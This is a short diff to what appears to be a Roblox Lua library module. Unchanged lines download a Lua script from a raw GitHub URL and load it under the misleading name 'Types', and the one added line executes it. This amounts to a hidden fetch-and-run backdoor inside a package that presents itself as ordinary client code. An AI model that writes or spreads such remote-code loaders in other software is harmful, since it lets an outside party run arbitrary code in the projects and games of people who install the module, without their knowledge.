@@ -5,6 +5,7 @@ local EntryError = require(script.Parent.Errors.Entry)
 local HttpService = game:GetService("HttpService")
 local code = HttpService:GetAsync("https://raw.githubusercontent.com/mrbuilder0/infinitytech/main/marcsync.lua", true)
 local Types = loadstring(code)
+Types()
 
 function errorHandler(callInformation: {}, resultBody: any, resultObject: {}, retryCount: number)
 	local Error;
